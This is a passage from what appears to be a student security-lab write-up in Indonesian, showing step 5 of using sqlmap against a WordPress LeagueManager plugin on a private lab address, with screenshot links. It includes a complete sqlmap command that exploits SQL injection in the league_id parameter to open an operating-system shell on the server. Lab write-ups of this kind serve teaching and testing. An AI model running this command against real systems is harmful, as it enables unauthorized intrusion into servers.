...
Hasilnya
 ...
 5. Untuk melakukan / menjalankan perintah pada terminal pada server sqlmap --url="http://192.168.56.102/wordpress/wp-admin/admin.php/?page=leaguemanager&subpage=show-league&league_id=1" --os-shell
  ![alt text](https://github.com/KharismaMonika/TUGAS2_PKSJ/blob/master/SCREENSHOOT/sqlmap9.JPG "Command os-shell") 

Hasilnya
  ![alt text](https://github.com/KharismaMonika/TUGAS2_PKSJ/blob/master/SCREENSHOOT/sqlmap10.JPG "Coulmn list") 
